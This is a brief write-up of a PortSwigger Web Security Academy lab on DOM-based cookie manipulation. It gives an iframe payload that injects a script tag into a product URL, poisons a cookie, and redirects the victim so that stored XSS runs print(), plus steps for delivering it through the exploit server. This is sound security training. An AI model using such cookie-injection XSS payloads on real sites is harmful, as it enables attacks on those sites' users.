# DOM-based cookie manipulation

## This lab demonstrates DOM-based client-side cookie manipulation. To solve this lab, inject a cookie that will cause [XSS](https://portswigger.net/web-security/cross-site-scripting) on a different page and call the `print()` function. You will need to use the exploit server to direct the victim to the correct pages.

___

**HINT:**

```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://YOUR-LAB-ID.web-security-academy.net';window.x=1;">
```

step 1

go to lab there a link `Last viewed product` next to home
when you will open any product then open another product it will display the last product
which is vulnerable
use Hint: replace with lab URl

```html
<iframe src="https://0a680071032737bc80fa268d00cf004f.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://0a680071032737bc80fa268d00cf004f.web-security-academy.net/';window.x=1;">
```

step 2

go to exploit section 
paste and click on deliver to exploit you will see lab solved

![[lab6_0.png]]

![[lab6_1.png]]